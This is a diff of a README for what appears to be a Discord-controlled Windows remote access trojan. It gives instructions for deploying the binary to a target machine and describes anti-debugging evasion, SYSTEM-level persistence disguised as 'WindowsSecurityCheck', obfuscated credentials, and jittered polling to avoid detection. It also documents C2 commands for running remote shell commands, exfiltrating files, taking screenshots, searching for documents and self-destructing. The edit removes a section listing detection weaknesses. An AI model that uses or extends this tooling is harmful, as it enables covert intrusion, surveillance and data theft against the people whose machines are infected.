@@ -66,25 +66,25 @@ The token, channel ID, and admin ID are XOR-obfuscated in source — never in pl
 
 ## Deploy
 
-Copy the `.exe` to the target machine. Run it. On first run the binary:
-1. Runs anti-analysis defenses (exits silently if debugger/analysis tool detected)
-2. Installs persistence (scheduled task at user logon + registry run key)
-3. Announces itself in the control channel
-4. Starts polling for commands
+Copy the `.exe` to the target machine and run it. The binary handles everything automatically:
 
-To stop temporarily: end the process in Task Manager. Persistence remains — the binary will restart at next logon.
+- **First run:** runs anti-analysis defenses, installs itself as persistent (scheduled task + registry run key), announces in the control channel, starts polling.
+- **On reboot:** the scheduled task restarts the binary automatically — no manual step needed.
+- **Stop:** end the process in Task Manager. Persistence remains; the binary restarts at next logon.
+
+The binary is the persistence. Copy it, run it, and it stays.
 
 ## Commands
 
-|| Command | Description |
+| Command | What it does |
 |---------|-------------|
-|| `!exec <name> <cmd>` | Run a shell command on the target matching `<name>` (hostname, uppercase) |
-|| `!download <name> <path>` | Upload a file from the target to the control channel (max 25 MB) |
-|| `!pingall` | Target responds with a presence check |
-|| `!screenshot` | Capture the primary screen and upload as BMP file |
-|| `!filesearch <pattern> [path]` | Search for files matching `<pattern>` (e.g. `*.docx`) under `[path]` (default: C:\\). Returns up to 100 results. |
-|| `!uninstall` | Remove persistence (scheduled task + registry run key). Binary remains on disk. |
-|| `!selfdestruct` | Remove persistence and schedule binary deletion on next reboot. Binary exits immediately. |
+| `!exec <name> <cmd>` | Run `<cmd>` on the target whose hostname matches `<name>` (uppercase). Result posted back. |
+| `!download <name> <path>` | Upload file at `<path>` from target `<name>` to the control channel (max 25 MB). |
+| `!pingall` | All targets respond with an alive message. |
+| `!screenshot` | Capture primary screen, upload as BMP file to the control channel. |
+| `!filesearch <pattern> [path]` | Search for files matching `<pattern>` (e.g. `*.docx`) under `[path]` (default: C:\). Up to 100 results. |
+| `!uninstall` | Remove persistence (scheduled task + registry run key). Binary stays on disk. |
+| `!selfdestruct` | Remove persistence + schedule binary deletion on next reboot. Exits immediately. |
 
 ## Security
 
@@ -98,21 +98,14 @@ To stop temporarily: end the process in Task Manager. Persistence remains — th
 - **Polling jitter** — 4–6 second random sleep between polls instead of fixed 5-second interval, to avoid a machine-identifiable pattern.
 - **Persistence** — scheduled task (runs at user logon as SYSTEM) + HKCU Run key. Both use a generic task name chosen at build time. Survives reboots.
 
-### Limitations
-
-- **Memory dump:** The token must be a string in memory for HTTP auth (`Authorization: Bot ***`). A dump taken while a request is in flight finds it. XOR storage defends the binary on disk only.
-- **XOR key in repo:** The key constants and obfuscated bytes are committed. A reverse engineer who decodes the logic recovers the values. This stops casual analysis, not a determined debugger.
-- **Anti-debug bypassable:** Checks can be circumvented by renaming tools, patching the binary, or dumping externally.
-- **Polling latency:** 4–6 second jitter interval vs real-time gateway. Acceptable for C2 command execution, not instant.
-- **Persistence visibility:** Scheduled tasks and registry run keys are visible to anyone inspecting the system. The task name is generic but not hidden.
-- **Self-destruct delay:** Binary deletion via MoveFileEx is deferred to next reboot. The file remains on disk until then.
-- **Screenshot size:** BMP format, no compression. Large screens produce multi-MB files — within Discord's 25MB limit but not minimal.
-
 ## Cleanup
 
-End the executable in Task Manager. For full removal, send `!uninstall` in the control channel to remove persistence (the binary stays on disk), or send `!selfdestruct` to remove persistence and schedule the binary for deletion on next reboot.
+Easy path — use the Discord commands:
 
-To manually remove persistence: delete the scheduled task named `WindowsSecurityCheck` via Task Scheduler, and remove the corresponding entry from `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
+- **`!uninstall`** — removes persistence (scheduled task + registry). Binary stays on disk. Copy and run again to re-persist.
+- **`!selfdestruct`** — removes persistence and schedules the binary for deletion on next reboot. Exits immediately.
+
+Or just delete the `.exe` file. If persistence was installed, also remove it manually: delete the `WindowsSecurityCheck` scheduled task in Task Scheduler.
 
 ## Repository structure
 
